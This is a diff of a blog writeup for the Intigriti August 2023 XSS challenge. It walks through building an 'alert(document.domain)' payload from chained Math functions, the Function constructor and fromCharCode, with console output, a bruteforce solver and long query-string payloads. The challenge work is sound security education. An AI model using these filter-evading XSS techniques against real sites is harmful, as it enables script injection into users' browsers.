@@ -2,7 +2,7 @@
 title: Intigriti 0823 – August XSS Challenge
 date: '2023-08-29'
 draft: false
-authors: ['default']
+authors: ['iyed']
 tags: ['Intigriti 0823', 'XSS', 'Web', 'JavaScript']
 summary: 'Writeup for Intigriti August XSS challenge by huli.'
 ---
@@ -209,7 +209,12 @@ Function('alert(document.domain)')
 
 and then calling it to pop the alert. But do we access the `Function()` with the constraints we have? Well every object in JavaScript has a constructor and that constructor might also have another constructor to create the final object. If you play with the developers tools console in chrome you could get what you want. Here is an example escalating from the `Math` object to the `Function()`.
 
-![Dev Tools Escalate To Function](/static/images/intigriti-0823/escalate_to_function.png)
+```js
+> Math.constructor
+< ƒ Object() { [native code] }
+> Math.constructor.constructor
+< ƒ Function() { [native code] }
+```
 
 You see the constructor of the `Math` object is `Object` function and since it’s a function the constructor would be our `Function()` We could’ve also done something like `Math.abs.constructor`. Any function would have that `Function` as its constructor I guess.
 
@@ -229,11 +234,36 @@ Inputting that into the calculator would be of the form `?q=Math.constructor.con
 
 We have some math functions that we could use to form some integers that might be useful. You ask how is this going to be useful? A thought that came to my mind after some time, and by knowing that there are some available strings that we could use we could get the desired characters with the String method `charAt` and generated the integer for the index. For example, `"ASDF".charAt(0)` would return the `A` character. **After having that character we could push it to the seeds array then we could join that array to form the string we want.** For example some JS object properties have names assigned to them. If we look at the `Math` object we could understand this fact.
 
-![Name From Property](/static/images/intigriti-0823/name_prop.png)
+```js
+> Math
+< Math {seeds: Array(5), abs: ƒ, acos: ƒ, acosh: ƒ, asin: ƒ, …}
+<	seeds: (5) [0.62536, 0.458483, 0.544523, 0.323421, 0.775465]
+<	E: 2.718281828459045
+<	LN2: 0.6931471805599453
+<	LN10: 2.302585092994046
+<	LOG2E: 1.4426950408889634
+<	LOG10E: 0.4342944819032518
+<	PI: 3.141592653589793
+<	SQRT1_2: 0.7071067811865476
+<	SQRT2: 1.4142135623730951
+<	abs: ƒ abs()
+<		length: 1
+<		name: "abs"
+<		arguments: (...)
+<		caller: (...)
+<		[[Prototype]]: ƒ ()
+<		[[Scopes]]: Scopes[0]
+<	acos: ƒ acos()
+```
 
 You see the `abs` property in the `Math` Object have some other useful property that we could use inside of it like the name. Doing something like `Math.abs.name` returns the string `"abs"` then doing `Math.abs.name.charAt(0)` would return the `"a"` character which the first character we want in our payload. How do we get the 0 integer now? Well we could get the last float from the `seeds` array using <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/pop" target="_blank">pop</a> array method and then apply <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math/floor" target="_blank">Math.floor()</a> on it to get `0`. The payload would be `Math.abs.name.charAt(Math.floor(Math.seeds.pop()))` and on the `q` param it would be `?q=Math.seeds.pop,Math.abs.name.charAt,Math.seeds.push` or even better testing this line of JS with the float as it is `0.77..` seemed to also return the same character since JS seems to convert float to integers by its own.
 
-![Weird JS 1](/static/images/intigriti-0823/weird_js_float_to_int.png)
+```js
+> Math.abs.name.charAt(Math.seeds.pop())
+< 'a'
+> Math.abs.name.charAt(0.775465)
+< 'a'
+```
 
 That would make the payload even smaller to regret that we wouldn’t bypass the 99 functions constraint. And finally we push it to the seeds array as we discussed earlier. Now calling the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/push">push</a> at the end will return an integer which is the new length of the seeds array we pushed to.
 
@@ -243,15 +273,15 @@ It’s 5 since we pop will return the last element + remove it from the array so
 
 ### How to get the 5 back to 0-4 range?
 
-Let’s say we want to get that 5 to 0 back as we have the `Math.log.name` will have the second character `l` as the character we want after the `a`. We want that `cos`/`sin` sometimes `tan` trigonometric functions will get something in the range `[0,1]` (`tan()` might have something greater sometimes).
+Let’s say we want to get that 5 to 0 back as we have the `Math.log.name` will have the second character `l` as the character we want after the `a`. We want that $cos$, $sin$ and sometimes the $tan$ trigonometric functions will get something in the range $[0,1]$ ($tan()$ might have something greater sometimes).
 
 ![Trigonometry Circle](/static/images/intigriti-0823/trig_circle.png)
 
-Counting in degrees, The `cos` and `sin` functions are coordinates of a point in the bounding line of a circle of radius=1. so the results are always in the range `[0,1]` the tan function might have greater results sometimes because `tan(x) = sin(x) / cos(x)` and you might have something like `0.7/0.5` for example which is going to be equal to 1.4 so it might be greater and might reach even greater results.
+Counting in degrees, The $cos$ and $sin$ functions are coordinates of a point in the bounding line of a circle of radius $r=1$. so the results are always in the range $[0,1]$ the tan function might have greater results sometimes because $tan(x) = $ $\displaystyle \frac{sin(x)}{cos(x)}$ and you might have something like $\displaystyle \frac{0.7}{0.5}$ for example which is going to be equal to 1.4 so it might be greater and might reach even greater results.
 
 ![Tan in Trigonometry Circle](/static/images/intigriti-0823/tan_trig_circle.png)
 
-Alright having this in hand we could apply `cos/sin` on the result returned from the `push` to get a positive integer close in `[0,1]` if it was all negative we could give a try to tan since `tan(x)=sin(x)/cos(x)` and negative/negative = something positive. If all of them didn’t get desired result then we could try and use other functions to get something close to what we want. So to get the `l` character, this is what I would apply first Math.cos on the 5 would return ~ 0.28366218546322625 and then Math.charAt on the Math.log.name. The payload is `?q=Math.seeds.pop,Math.abs.name.charAt,Math.seeds.push,Math.cos,Math.log.name.charAt` and don't forget to push this too. We repeat the same process till we form the word alert pushed to the seeds array. This is the payload to get the alert string pushed:
+Alright having this in hand we could apply $cos$ and $sin$ on the result returned from the `push` to get a positive integer close in $[0,1]$ if it was all negative we could give a try to tan since $tan(x) = $ $\displaystyle \frac{sin(x)}{cos(x)}$ and $x, y < 0;$ $\displaystyle \frac{x}{y}$ $ = z > 0$. If all of them didn’t get desired result then we could try and use other functions to get something close to what we want. So to get the `l` character, this is what I would apply first Math.cos on the 5 would return `~ 0.28366218546322625` and then Math.charAt on the Math.log.name. The payload is `?q=Math.seeds.pop,Math.abs.name.charAt,Math.seeds.push,Math.cos,Math.log.name.charAt` and don't forget to push this too. We repeat the same process till we form the word alert pushed to the seeds array. This is the payload to get the alert string pushed:
 
 ```
 ?q=Math.seeds.pop,Math.abs.name.charAt,Math.seeds.push,Math.cos,Math.log.name.charAt,Math.seeds.push,Math.cos,Math.exp.name.charAt,Math.seeds.push,Math.cos,Math.round.name.charAt,Math.seeds.push,Math.sin,Math.tan.name.charAt,Math.seeds.push
@@ -267,11 +297,17 @@ Nice! Now we have another problem we need to open parenthesis but I don’t thin
 
 The only thing we could do is to use all the math functions we have in the `Math` object and try to get something in the range `[asciiCode(character), asciiCode(character)+1[` since as we said javascript will cast floats to integers by itself when referencing indices. Well for this one I thought of making a JS script that would bruteforce with all possible functions to generated a desired character then we could use `String.fromCharCode` to convert it to a character. Before starting to talk about the script, how do we access the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode" target="_blank">fromCharCode</a> `String` method. `String` object is a constructor of any string. So we if access a string first then do `some_string.constructor` we would access to the `String` object from which we can call the `fromCharCode` method on the number we have. Also `String.fromCharCode(97.111)` is equivalent to `String.fromCharCode(97)` so it’s also doing the cast here from float to int.
 
-![fromCharCode Doing The Cast Too](/static/images/intigriti-0823/fromCharCode_cast.png)
+```js
+> String.fromCharCode(97.111)
+< 'a'
+```
 
 We have bunch of strings we could access as we discussed earlier something like `Math.abs.name` then do `Math.abs.name.constructor.fromCharCode` this would return the method.
 
-![Escalate To fromCharCode](/static/images/intigriti-0823/escalate_to_String_fromCharCode.png)
+```js
+> Math.abs.name.constructor.fromCharCode
+< ƒ fromCharCode() { [native code] }
+```
 
 But my brain favorized using `Math.toString.name` instead of `Math.abs.name` don’t ask me why 😔. Fine. Now into bruteforcing to get the numbers. Here is my Node.js bruteforce script.
 
@@ -347,13 +383,23 @@ for (a of funcs) {
 
 I just initialized an array containing all the needed Math functions and started 2 nested blocks of `for` loops the first one would just run a combination of 4 functions to see if we could get that number and the second block would try to minimize the number if the first block didn’t work by calculating its <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math/sqrt" target="_blank">sqrt</a> and working with the result of the sqrt instead of the number it self making it smaller because sometimes the number it self would have a possible combination of 4 and might require you to make it 5 in order to get the number and sometimes even a combination of 5 is not possible. I chose 4 as a combination since 3 wouldn’t have any possible ones and 5 is longer so 4 is ideal I don’t remember if I really had to change it sometimes to 5 in order to get the right number but you could tell by looking at my final payload. Anyways, after pushing the last character in `"alert"` which is `t` the new length of the array became 9. To calculate any possible combination with 9 as the number we would apply functions on and the ascii code of `(` = 40 we run the script with the command `node solver.js 9 40`. This is the returned result:
 
-![Script Generated Payload](/static/images/intigriti-0823/script_generated_payload.png)
+```bash
+$ node solver.js 9 40
+Math.clz32,Math.cosh,Math.log2,Math.ceil
+40
+```
 
 To get 40 from the 9 we could use the payload `Math.clz32,Math.cosh,Math.log2,Math.ceil` which will execute in the order `Math.ceil(Math.log2(Math.cosh(Math.clz32(9))))`. Then we apply `String.fromCharCode`. So final payload for this character is `Math.clz32,Math.cosh,Math.log2,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push` and the character is pushed. After this the array length is going to be 10, we could repeat the same process to get `d` character by applying `tan` to it since `cos` and `sin` are negative yielding back $0.6483608274590866$ and then where do we get the `d` from? Well we don’t really need to only use the names of functions inside the `Math` object we could escalate to another object and use the names of functions there. Here I just escalated to the `Object` object and there is a property there called `defineProperties` in which we could get the `d` char.
 
-![Firefox Object Properties](/static/images/intigriti-0823/firefox_object_props.png)
-
-_I just used firefox here since chrome wouldn’t let me for some reason look into the object properties and I didn’t have that much time to figure out how to make it show them._
+```js
+> Math.constructor
+< function Object()
+< 	assign: function assign()
+< 	create: function create()
+< 	defineProperties: function defineProperties()
+< 		length: 2
+< 		name: "defineProperties"
+```
 
 Alright the payload is then `Math.tan,Math.constructor.defineProperties.name.charAt,Math.seeds.push`. Some characters as I said before, don’t have index 0 but a greater one like 1, 2, 3 or even 4. We could in this case function like `Math.log10` to get a number inside that range or `Math.log1p` you could just try them all until you get the desired number. For example we need the character `o`. When searching for it, I first found it in the `round` string with index = 1. And after pushing the last character, push returned 11. Applying log10 to 11 will return 1.04. And so on and so far, until you generate all needed characters. The script is used for the character `.` and `)` later and that’s all.
 
@@ -381,17 +427,23 @@ https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.a
 
 Now we have to join it using `Math.seeds.join`. Here is the result from Dev Tools.
 
-![Wrong Join Seeds](/static/images/intigriti-0823/wrong_join_result_seeds.png)
+```js
+> Math.seeds.join()
+< 'a,l,e,r,t,(,d,o,c,u,m,e,n,t,.,d,o,m,a,i,n,)'
+```
 
 Oops! We have them comma separated 😞. So how to make it join without the comma? We know that `Math.seeds.join("")` with an empty string as an argument will join without the `,`.
 
-![Seeds Empty String Join](/static/images/intigriti-0823/seeds_empty_string_join.png)
+```js
+> Math.seeds.join("")
+< 'alert(document.domain)'
+```
 
 But I’m not sure if have some empty strings out there to use and we couldn’t use String method to form it from a number. However converting converting an empty array to a string in JS will return an empty string!
 
 ```js
 > [].toString()
-''
+< ''
 ```
 
 But how do we get the empty array? We could just call <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/Array" target="_blank">Array</a> constructor with a 0 argument which means creating an empty array and then we could apply join with that empty array as argument. and in order to access to the `Array` constructor we could just access the seeds array and then it’s constructor to get it. Also to get the 0, we could just run `Math.floor` since the returned number from the last shift is 0.62536 making it 0. This is the payload to do so: `Math.floor,Math.seeds.constructor,Math.seeds.join`.
@@ -406,7 +458,7 @@ And the result is
 
 ![Final Steps To Get Final String](/static/images/intigriti-0823/steps_till_payload_string.png)
 
-Now the only thing to do is to pass that string to the `Function()` we talked about earlier and call it using sort() array method.
+Now the only thing to do is to pass that string to the `Function()` we talked about earlier and call it using `sort()` array method.
 
 ### Joining it all together
 
